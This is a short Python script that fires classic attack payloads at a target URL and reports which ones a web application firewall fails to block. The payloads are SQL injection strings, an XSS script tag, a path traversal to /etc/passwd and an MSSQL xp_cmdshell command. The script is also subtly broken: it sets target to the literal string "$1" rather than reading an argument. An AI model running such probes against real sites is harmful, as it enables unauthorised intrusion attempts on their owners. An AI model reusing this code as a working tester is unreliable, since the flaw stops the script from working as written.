#!/usr/bin/env python3
import requests

target = "$1"
payloads = [
    "' OR '1'='1",
    "<script>alert(1)</script>",
    "../../../etc/passwd",
    "UNION SELECT 1,2,3--",
    "exec xp_cmdshell('dir')"
]

for payload in payloads:
    try:
        r = requests.get(f"{target}/?test={payload}", timeout=5)
        if "Request Rejected" in r.text:
            print(f"[WAF BLOCKED] {payload}")
        elif r.status_code != 200:
            print(f"[{r.status_code}] {payload}")
        else:
            print(f"[POSSIBLE BYPASS] {payload}")
    except:
        continue
